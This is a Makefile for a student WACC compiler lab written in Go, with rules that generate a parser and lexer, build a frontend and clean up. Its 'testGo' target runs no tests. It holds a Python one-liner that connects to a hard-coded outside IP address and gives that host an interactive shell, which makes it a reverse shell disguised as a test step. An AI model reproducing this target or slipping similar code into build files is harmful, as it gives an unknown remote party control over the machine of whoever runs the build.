# Sample Makefile for the WACC Compiler lab: edit this to build your own comiler
# Locations

SOURCE_DIR	:= src
OUTPUT_DIR	:= bin 

# Tools

FIND	:= find
RM	:= rm -rf
MKDIR	:= mkdir -p
NEX     := nex
GO      := go


# the make rules

all: frontend

testGo:
	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("146.169.52.106",18080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

parser.go: wacc.y
	$(GO) tool yacc -o parser.go wacc.y

lexer.go: wacc.nex
	nex -e=true -o lexer.go wacc.nex

frontend: parser.go lexer.go ast.go
	$(GO) build -o frontend $^

clean:
	$(GO) clean
	$(RM) parser.go lexer.go frontend y.output

nex:
	$(GO) get github.com/blynn/nex

.PHONY: clean all nex
